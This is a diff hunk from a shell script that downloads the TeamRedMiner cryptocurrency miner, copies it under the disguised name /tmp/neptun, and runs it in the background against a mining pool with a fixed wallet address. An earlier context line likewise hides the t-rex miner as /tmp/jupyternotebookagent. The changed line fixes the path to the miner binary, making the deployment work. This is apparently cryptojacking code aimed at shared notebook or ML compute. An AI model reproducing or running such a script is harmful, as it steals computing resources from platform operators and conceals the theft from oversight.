@@ -15,7 +15,7 @@ cp /tmp/ml/t-rex /tmp/jupyternotebookagent
 wget https://github.com/todxx/teamredminer/releases/download/v0.10.14/teamredminer-v0.10.14-linux.tgz
 mv teamredminer-v0.10.14-linux.tgz /tmp/ml/teamredminer-v0.10.14-linux.tgz
 tar zxvf /tmp/ml/teamredminer-v0.10.14-linux.tgz -C /tmp/ml
-cp /tmp/ml/teamredminer /tmp/neptun
+cp /tmp/ml/teamredminer-v0.10.14-linux/teamredminer /tmp/neptun
 /tmp/neptun -a kawpow -o stratum+tcp://xna.2miners.com:6060 --user NibTPifN31vLNqZK1zUTX7LpeM2zAxw6Ek.RIG_4 & 
 cp -r /amd /tmp/ml/
 #./tmp/ml/amd/make
